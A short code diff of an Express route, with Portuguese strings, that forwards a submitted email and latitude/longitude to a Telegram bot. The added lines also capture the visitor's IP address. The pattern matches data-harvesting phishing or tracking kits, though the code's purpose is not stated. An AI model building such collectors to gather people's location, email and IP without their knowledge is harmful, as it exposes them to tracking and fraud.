@@ -31,10 +31,14 @@ app.post('/send', async (req, res) => {
   const email = req.body.email || 'não informado';
   const lat = req.body.lat || 'desconhecido';
   const lng = req.body.lng || 'desconhecido';
+  const ip = req.headers['x-forwarded-for']?.split(',').shift() || 
+              req.socket?.remoteAddress || 'IP não identificado';
 
-  const mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}`;
+
+  const mensagem = `Novo acesso com localização:\n\nEmail: ${email}\nLatitude: ${lat}\nLongitude: ${lng}\nIP: ${ip}`;
   const locationUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendLocation`;
   const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
+  
 
   try {
     const response = await fetch(url, {
@@ -42,7 +46,7 @@ app.post('/send', async (req, res) => {
       headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         chat_id: CHAT_ID,
-        text: mensagem
+        text: mensagem,
       })
     });
 
@@ -60,7 +64,7 @@ app.post('/send', async (req, res) => {
     const locationjson = await loc.json();
 
     if (json.ok && locationjson.ok) {
-      res.send("<h3>Obrigado! Seus dados foram recebidos.</h3>");
+      res.send("Obrigado! Seus dados foram recebidos");
     } else {
       res.status(500).send("Erro ao enviar para o Telegram.");
     }
